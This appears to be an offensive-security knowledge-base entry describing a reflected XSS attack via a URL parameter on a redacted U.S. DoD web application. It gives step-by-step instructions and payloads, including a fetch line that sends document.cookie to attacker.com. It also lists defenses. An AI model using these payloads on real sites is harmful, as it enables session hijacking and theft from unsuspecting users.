---
tags:
  - xss
  - reflected-xss
  - javascript-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:32.067Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 1ade5b30-3ad3-46e5-80c4-883f04a930d1
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Reflected-XSS-Payload-via-URL-Parameter

## Summary

This procedure exploits a reflected Cross-Site Scripting (XSS) vulnerability in a web application by injecting a JavaScript payload into an unsanitized URL parameter, causing the code to execute in the victim's browser upon page load. It demonstrates how lack of input validation allows attackers to steal session information, modify page content, or exfiltrate cookies by tricking users into visiting a crafted malicious URL.

## Description

In the context of a U.S. Department of Defense web application, user input in URL parameters such as 'onload' is reflected back into the HTML without proper sanitization or encoding. An attacker crafts a URL with a payload like onload="prompt(1)", URL-encoded as onload=%22prompt(1)%22, and shares it with victims. When accessed, the browser interprets and executes the injected JavaScript, potentially leading to session theft or phishing. This targets public-facing web apps and requires no authentication, making it suitable for drive-by attacks.

## Requirements

1. Access to a vulnerable web application endpoint (e.g., https://██████████/███)
2. A modern web browser to test and deliver the payload
3. Basic knowledge of URL encoding and JavaScript
4. Victim interaction via email, social engineering, or direct link sharing

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., using HTML entity encoding for user inputs)
- Use Content Security Policy (CSP) headers to restrict inline script execution
- Deploy Web Application Firewalls (WAFs) to detect and block common XSS payloads
- Monitor server logs for suspicious URL parameters and anomalous JavaScript execution

## Objectives

1. Execute arbitrary JavaScript in the victim's browser context
2. Steal sensitive data like cookies or session tokens
3. Demonstrate the vulnerability for reporting or remediation

## Instructions

### Step 1: Identify Vulnerable Parameter

**Context**: Examine the web application's URL structure to find parameters that are reflected in the response without sanitization, such as 'onload' or similar event handlers.

Navigate to the target page (e.g., https://██████████/███) and inspect how parameters appear in the HTML source.

**Expected Output**: Confirmation that the parameter value is directly inserted into HTML attributes.

### Step 2: Craft and URL-Encode Payload

**Context**: Create a simple JavaScript payload to test execution, such as prompt(1), and encode it for URL transmission to bypass basic filters.

Use a URL encoder to convert "prompt(1)" to %22prompt(1)%22. Append it to the parameter: ?onload=%22prompt(1)%22.

**Expected Output**: Encoded payload ready for injection.

### Step 3: Inject and Test Payload

**Context**: Deliver the malicious URL to a victim or test environment to trigger execution.

Access the full URL: https://██████████/███?onload=%22prompt(1)%22 in a browser. The onload event should fire, displaying a prompt dialog.

**Expected Output**: Browser executes the JavaScript, showing an alert or prompt.

### Step 4: Validate Impact

**Context**: Escalate the test to confirm data exfiltration potential.

Modify the payload to something like onload="fetch('https://attacker.com/steal?cookie='+document.cookie)" to simulate cookie theft. Observe network requests in browser dev tools.

**Expected Output**: Successful transmission of sensitive data to attacker-controlled server.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[web-vulnerability]]
